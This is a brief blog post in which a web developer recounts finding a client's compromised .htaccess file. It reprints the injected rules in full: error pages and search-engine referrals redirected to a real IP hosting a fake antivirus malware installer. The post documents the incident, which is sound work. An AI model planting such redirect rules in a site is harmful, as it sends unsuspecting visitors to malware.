---
layout: post
title: ".htaccess hacked"
custom_v2_id: 50
---

Today a client called me telling me that its website was unavailable, or more
exactly that the full content of the FTP was displayed instead of its
homepage.

After a little investigation it appears that the .htaccess file had been
modified, here was the content I found :

    
    RewriteEngine On  
    ErrorDocument 400 http://217.23.5.232/hitin.php?land=20&affid=20116  
    ErrorDocument 401 http://217.23.5.232/hitin.php?land=20&affid=20116  
    ErrorDocument 403 http://217.23.5.232/hitin.php?land=20&affid=20116  
    ErrorDocument 404 http://217.23.5.232/hitin.php?land=20&affid=20116  
    ErrorDocument 500 http://217.23.5.232/hitin.php?land=20&affid=20116  
    RewriteCond %{HTTP_REFERER} .*google.* [OR]  
    RewriteCond %{HTTP_REFERER} .*ask.* [OR]  
    RewriteCond %{HTTP_REFERER} .*yahoo.* [OR]  
    RewriteCond %{HTTP_REFERER} .*excite.* [OR]  
    RewriteCond %{HTTP_REFERER} .*altavista.* [OR]  
    RewriteCond %{HTTP_REFERER} .*msn.* [OR]  
    RewriteCond %{HTTP_REFERER} .*netscape.* [OR]  
    RewriteCond %{HTTP_REFERER} .*aol.* [OR]  
    RewriteCond %{HTTP_REFERER} .*hotbot.* [OR]  
    RewriteCond %{HTTP_REFERER} .*goto.* [OR]  
    RewriteCond %{HTTP_REFERER} .*infoseek.* [OR]  
    RewriteCond %{HTTP_REFERER} .*mamma.* [OR]  
    RewriteCond %{HTTP_REFERER} .*alltheweb.* [OR]  
    RewriteCond %{HTTP_REFERER} .*lycos.* [OR]  
    RewriteCond %{HTTP_REFERER} .*search.* [OR]  
    RewriteCond %{HTTP_REFERER} .*metacrawler.* [OR]  
    RewriteCond %{HTTP_REFERER} .*bing.* [OR]  
    RewriteCond %{HTTP_REFERER} .*dogpile.*  
    RewriteRule ^(.*)$ http://217.23.5.232/hitin.php?land=20&affid=20116 [R=301,L]

A little search online told me that this IP refer to a malware website
launching a fake Antivirus software installation.

I have no idea how the .htaccess got modified, but I changed the FTP password.

